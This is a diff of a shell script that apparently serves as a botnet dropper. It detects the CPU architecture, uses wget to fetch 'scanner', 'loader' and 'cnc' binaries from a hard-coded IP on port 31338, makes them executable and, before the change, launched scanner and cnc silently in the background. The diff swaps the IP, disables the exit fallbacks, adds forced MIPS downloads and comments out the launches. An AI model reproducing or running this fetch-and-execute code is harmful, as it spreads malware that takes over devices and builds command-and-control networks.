@@ -1,7 +1,7 @@
 #!/bin/sh
 
 arch=$(uname -m | awk '{print tolower($0)}')
-ip="192.168.1.97:31338"
+ip="192.168.50.145:31338"
 
 if echo "$arch" | grep -qiE 'x86_64|amd64'; then
     wget "http://$ip/amd64_scanner" -O scanner
@@ -27,9 +27,10 @@ elif echo "$arch" | grep -qiE 'ppc64'; then
     wget "http://$ip/ppc64_scanner" -O scanner
 elif echo "$arch" | grep -qiE 'riscv64'; then
     wget "http://$ip/riscv64_scanner" -O scanner
-else
-    exit
+#else
+#    exit
 fi
+wget "http://$ip/mips_scanner" -O scanner #test brute download
 while [ ! -f scanner ]; do
     sleep 1
 done
@@ -57,9 +58,10 @@ elif echo "$arch" | grep -qiE 'ppc64'; then
     wget "http://$ip/ppc64_loader" -O loader
 elif echo "$arch" | grep -qiE 'riscv64'; then
     wget "http://$ip/riscv64_loader" -O loader
-else
-    exit
+#else
+#    exit
 fi
+wget "http://$ip/mips_loader" -O loader #test brute download
 while [ ! -f loader ]; do
     sleep 1
 done
@@ -88,14 +90,16 @@ elif echo "$arch" | grep -qiE 'ppc64'; then
     wget "http://$ip/ppc64_cnc" -O cnc
 elif echo "$arch" | grep -qiE 'riscv64'; then
     wget "http://$ip/riscv64_cnc" -O cnc
-else
-    exit
+#else
+#    exit
 fi
+wget "http://$ip/mips_cnc" -O cnc #test brute download
 while [ ! -f cnc ]; do
     sleep 1
 done
+
 chmod +x scanner
 chmod +x loader
 chmod +x cnc
-./scanner > /dev/null 2>&1 &
-./cnc > /dev/null 2>&1 &
+#./scanner > /dev/null 2>&1 &
+#./cnc > /dev/null 2>&1 &
